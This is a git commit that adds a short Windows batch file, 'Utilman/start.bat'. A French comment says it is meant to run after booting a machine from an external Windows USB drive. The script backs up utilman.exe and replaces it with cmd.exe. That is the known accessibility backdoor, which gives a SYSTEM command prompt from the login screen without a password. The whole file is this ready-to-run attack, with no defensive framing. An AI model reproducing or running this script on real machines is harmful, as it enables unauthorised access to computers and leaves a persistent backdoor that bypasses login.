61641bd0904170cec11bbab0bcd7ef38a2dff89d
BiMathAx <61063210+MathKode@users.noreply.github.com>
2023-01-09 16:35:49 +0100

    Create start.bat

---
+++ Utilman/start.bat
@@ -0,0 +1,5 @@
+@rem Code a executer sur un ordinateur booté sur une usb externe windows
+@echo off
+
+copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.bak
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
